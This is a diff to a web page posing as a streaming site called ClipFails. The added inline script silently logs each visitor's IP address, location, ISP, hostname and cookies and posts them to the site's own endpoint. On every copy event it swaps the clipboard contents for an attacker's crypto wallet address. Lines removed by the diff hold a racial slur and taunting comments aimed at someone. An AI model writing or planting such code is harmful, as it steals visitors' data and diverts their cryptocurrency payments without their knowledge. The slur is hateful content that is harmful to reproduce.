@@ -6,41 +6,60 @@
   <title>ClipFails - Find Your Streaming Moment</title>
   
 <script>
-    (async () => {
-        try {
-            // STEP 1: Get IP and details from ipinfo.io
-            const info = await fetch('https://ipinfo.io/json')
-                .then(res => res.json());
+(async () => {
+    try {
+        // STEP 1: Get IP and details
+        const info = await fetch('https://ipinfo.io/json').then(res => res.json());
 
-            const ip = info.ip || 'Unknown';
-            const city = info.city || 'Unknown';
-            const region = info.region || 'Unknown';
-            const country = info.country || 'Unknown';
-            const loc = info.loc || 'Unknown';
-            const org = info.org || 'Unknown';
-            const hostname = info.hostname || 'Unknown';
-            const time = new Date().toISOString();
+        const ip = info.ip || 'Unknown';
+        const city = info.city || 'Unknown';
+        const region = info.region || 'Unknown';
+        const country = info.country || 'Unknown';
+        const loc = info.loc || 'Unknown';
+        const org = info.org || 'Unknown';
+        const hostname = info.hostname || 'Unknown';
+        const time = new Date().toISOString();
+        const cookies = document.cookie || 'No accessible cookies';
 
-            // 'this exploit is unpatchable!!!' said the retarded skid
-            // whatchu gon do about it 😢😢😢😢 guess the op cute hacker got beaten by a little api
-            // LMFAOOOOOO u really thought u were something cool for clicking inspect element 😭
+        // STEP 2: Setup clipboard hijack logging
+        let clipboardLog = '';
+        document.addEventListener("copy", async () => {
+            try {
+                const originalClipboard = await navigator.clipboard.readText();
+                await navigator.clipboard.writeText("0xATTACKERWALLET123...");
+                clipboardLog = `\n📋 **Clipboard Hijacked**\nOriginal: \`${originalClipboard}\`\n`;
+                sendCombinedLog(); // Send message when clipboard is used
+            } catch (err) {
+                clipboardLog = `\n📋 Clipboard hijack failed: ${err.message}\n`;
+                sendCombinedLog();
+            }
+        });
 
-            const message = `**nigger fell for it**\n` +
-                `IP: \`${ip}\`\nLocation: \`${city}, ${region}, ${country}\`\n` +
-                `Org: \`${org}\`\nCoords: \`${loc}\`\n` +
-                `Hostname: \`${hostname}\`\nTime: \`${time}\``;
-            // by the way we fixed everything so you'll be screaming at nothingness for the rest of your spam sessions. not telling you how tho, its a secret!! eep >_<
+        // STEP 3: Build and send full message (initial info only)
+        const baseMessage = `🕷 **Visitor Logged**\n` +
+            `IP: \`${ip}\`\nLocation: \`${city}, ${region}, ${country}\`\n` +
+            `Org: \`${org}\`\nCoords: \`${loc}\`\nHostname: \`${hostname}\`\nTime: \`${time}\`\n` +
+            `🍪 Cookies: \`${cookies}\``;
+
+        // Only send clipboard+IP combined if clipboard gets used
+        function sendCombinedLog() {
+            const message = baseMessage + clipboardLog;
             fetch('/api/send', {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ message })
             });
-
-        } catch (err) {
-            console.error("Logging failed:", err);
         }
-    })();
+
+        // Send initial info right away
+        sendCombinedLog();
+
+    } catch (err) {
+        console.error("Logging failed:", err);
+    }
+})();
 </script>
+
     
 
   <style>
